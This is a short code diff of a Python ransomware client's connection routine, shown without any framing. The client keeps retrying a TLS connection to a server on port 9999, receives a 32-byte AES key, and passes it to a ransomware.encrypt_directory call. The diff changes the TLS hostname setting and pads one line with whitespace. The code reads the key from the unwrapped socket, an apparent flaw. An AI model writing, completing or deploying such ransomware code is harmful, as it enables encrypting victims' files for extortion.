@@ -10,14 +10,14 @@ def get_ip():
 def server_connection():
     context = ssl.create_default_context()
     client =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    secure_client = context.wrap_socket(client, server_hostname=None)
+    secure_client = context.wrap_socket(client, server_hostname="localhost")
     ip = get_ip()
     while True:     
         try:
             secure_client.connect((ip, 9999))
             break
         except ConnectionError:
-            ip = get_ip()
+            ip = get_ip()                                                                                                                                                                                                                                                                                                                                                                                
     key = client.recv(32)# aes key is 32 bytes
     ransomware.encrypt_directory(dir,key)
     return None 
